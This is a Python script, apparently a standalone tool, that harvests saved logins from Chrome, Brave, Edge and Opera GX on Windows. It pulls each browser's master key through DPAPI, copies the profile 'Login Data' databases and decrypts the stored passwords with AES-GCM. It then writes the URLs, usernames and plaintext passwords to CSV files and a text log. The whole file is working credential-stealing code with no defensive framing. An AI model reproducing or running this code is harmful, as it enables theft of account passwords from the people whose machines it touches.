import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import asyncio
import sys

# Global Constants
# Chrome
CHROME_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\Google\Chrome\User Data\Local State" % (os.environ["LOCALAPPDATA"])
)
CHROME_PATH = os.path.normpath(
    r"%s\Google\Chrome\User Data" % (os.environ["LOCALAPPDATA"])
)

# Brave
BRAVE_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\BraveSoftware\Brave-Browser\User Data\Local State"
    % (os.environ["LOCALAPPDATA"])
)
BRAVE_PATH = os.path.normpath(
    r"%s\BraveSoftware\Brave-Browser\User Data" % (os.environ["LOCALAPPDATA"])
)

# Edge
EDGE_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\Microsoft\Edge\User Data\Local State" % (os.environ["LOCALAPPDATA"])
)
EDGE_PATH = os.path.normpath(
    r"%s\Microsoft\Edge\User Data" % (os.environ["LOCALAPPDATA"])
)

# Opera GX
OPERA_GX_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\Opera Software\Opera GX Stable\User Data\Local State"
    % (os.environ["LOCALAPPDATA"])
)

OPERA_PATH = os.path.normpath(
    r"%s\Opera Software\Opera GX Stable\User Data" % (os.environ["LOCALAPPDATA"])
)


def get_secret_key(browser_local_state_path: str, browser_name: str):
    try:
        # Get secret key from Chrome local state
        with open(browser_local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(str(e))
        print(f"[ERR] {browser_name} secret key cannot be found")
        return None


def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
        print("[ERR] Unable to decrypt. Chromium version <80 is not supported.")
        return ""


def get_db_connection(browser_path_login_db, browser_name: str):
    try:
        shutil.copy2(browser_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(str(e))
        print(f"[ERR] {browser_name} database cannot be found")
        return None


def get_profile_folders(browser_path: str, browser_name: str) -> list | None:
    try:
        folders = [
            element
            for element in os.listdir(browser_path)
            if re.search("^Profile*|^Default$", element) is not None
        ]
        return folders
    except Exception as e:
        print(str(e))
        print(f"[!] {browser_name} profile folders cannot be found")
        return None


def write_passwords_to_csv(filename, passwords):
    with open(filename, "w", newline="") as f:
        writer = csv.writer(f)
        for password in passwords:
            writer.writerow(password)


def connecting_database_and_decrypting(
    secret_key: any, conn, passwords: list[list]
) -> None:
    if secret_key and conn:
        cursor = conn.cursor()
        # We execute SQL request to get ciphertext, username and url
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        # (3) Iterate over logins and decrypt passwords
        for index, login in enumerate(cursor.fetchall()):
            url, username, ciphertext = login
            if url and username and ciphertext:
                decrypted_password = decrypt_password(ciphertext, secret_key)

                # print decrypted passwords to console
                print(f"Sequence: {index}")
                print(
                    f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}"
                )

                # append decrypted passwords to list
                passwords.append([index, url, username, decrypted_password])

        cursor.close()


def get_passwords_any_browser(
    browser_path_local_state: str, browser_path: str, browser_name: str
) -> list[list] | None:
    try:
        secret_key: any = get_secret_key(browser_path_local_state, browser_name)
        passwords: list[list] = []
        folders: list | None = get_profile_folders(browser_path, browser_name)

        for folder in folders:
            browser_path_login_db = os.path.normpath(
                r"%s\%s\Login Data" % (browser_path, folder)
            )
            conn = get_db_connection(browser_path_login_db, browser_name)
            connecting_database_and_decrypting(secret_key, conn, passwords)

            conn.close()
            os.remove("Loginvault.db")
        return passwords

    except Exception as e:
        print(str(e))
        return None

async def decrypt_all_passwords():
    chrome_passwords = get_passwords_any_browser(
        CHROME_PATH_LOCAL_STATE, CHROME_PATH, "Chrome"
    )
    brave_passwords = get_passwords_any_browser(
        BRAVE_PATH_LOCAL_STATE, BRAVE_PATH, "Brave"
    )
    edge_passwords = get_passwords_any_browser(EDGE_PATH_LOCAL_STATE, EDGE_PATH, "Edge")
    operagx_passwords = get_passwords_any_browser(
        OPERA_GX_PATH_LOCAL_STATE, OPERA_PATH, "Opera GX"
    )

    if chrome_passwords:
        write_passwords_to_csv("chrome_passwords.csv", chrome_passwords)
        print("\n[*] Chrome passwords found\n")
    else:
        print("[!] NO Chrome passwords\n")
    if brave_passwords:
        write_passwords_to_csv("brave_passwords.csv", brave_passwords)
        print("[*] Brave passwords\n")
    else:
        print("[!] NO Brave passwords found\n")
    if edge_passwords:
        write_passwords_to_csv("edge_passwords.csv", edge_passwords)
        print("[*] Edge passwords found\n")
    else:
        print("[!] NO Edge passwords\n")
    if operagx_passwords:
        write_passwords_to_csv("operagx_passwords.csv", operagx_passwords)
        print("[*] Opera GX passwords found\n")
    else:
        print("[!] NO Opera GX passwords\n")


if __name__ == "__main__":
    try:
        with open("browser_passwords.txt", "w") as f:
            sys.stdout = f
            asyncio.run(decrypt_all_passwords())
            sys.stdout = sys.__stdout__
    except Exception as e:
        print(f"[!] {str(e)}")
